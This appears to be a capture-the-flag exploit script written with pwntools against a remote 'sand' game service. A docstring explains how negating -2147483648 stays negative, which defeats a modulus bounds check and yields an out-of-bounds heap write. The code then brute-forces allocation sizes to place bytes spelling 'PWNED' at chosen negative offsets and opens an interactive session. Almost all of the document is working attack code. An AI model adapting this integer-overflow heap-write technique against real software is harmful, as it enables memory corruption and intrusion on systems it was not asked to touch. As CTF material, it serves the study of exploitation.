#!/usr/bin/python
#coding=utf-8
 
from pwn import *
import itertools

"""
When you negate a number in 2s complement, you invert the bits and add 1. This has the effect that
-0x80000000 = 0x80000000 or, for a signed integer type, -(-2147483648) == -2147483648. The program
allows us to place data in one of two allocations, and uses the sign of the offset to determine which
allocation to write to. Normally, wherever we write will fall within the buffers because our 'move'
should always be positive, and restricted to the size of the allocation by the modulus. However,
because of the above, we can achieve a negative index by making a move of -2147483648.
From there, we can control our write by changing the size of the allocation, accounting for whether
freed allocation are returned to the top chunk.
"""

if len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
else:
    print("Please provide host and port")
    exit()
 
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
 


start_idx = -0x60

def go_test(msg):
    global TOTAL_ALLOCATION
    global start_idx
    pos_dict = {
        "P": start_idx,
        "W": start_idx + 1,
        "N": start_idx + 2,
        "E": start_idx + 3,
        "D": start_idx + 4,
    }
    for c in msg:
        distance = pos_dict[c]
        found = False
        for i in range(2,0x20000):

            if ((-2147483648 % i) - i) == (distance - TOTAL_ALLOCATION):
                allocation_size = ((i + 7) & 0xfffffff0) + 0x10
                TOTAL_ALLOCATION += (allocation_size*2)
                found = True
                break

        if not found: return False

    return True
    
permutations = itertools.permutations("PWNED")
permutations_list = [''.join(p) for p in permutations]
answer = ""

for perm in permutations_list:

    TOTAL_ALLOCATION = 0
    result = go_test(perm)
    if result:
        print(perm)
        answer = perm
        break

def new_game(size):
    sla(">", "1")
    sla(">", str(size))


def put_sand(sand, pos):
    sla(">", "2")
    sla(">", str(pos))
    sla(">", sand)

TOTAL_ALLOCATION = 0

def go(msg):
    global TOTAL_ALLOCATION
    pos_dict = {
        "P": start_idx,
        "W": start_idx + 1,
        "N": start_idx + 2,
        "E": start_idx + 3,
        "D": start_idx + 4,
    }
    for c in msg:
        distance = pos_dict[c]
        for i in range(2,0x20000):
            if ((-2147483648 % i) - i) == (distance - TOTAL_ALLOCATION):
                new_game(i)
                put_sand(c, -2147483648)
                allocation_size = ((i + 7) & 0xfffffff0) + 0x10
                if allocation_size < 0x400: TOTAL_ALLOCATION += (allocation_size*2)
                break
    
go(answer)
p.interactive()



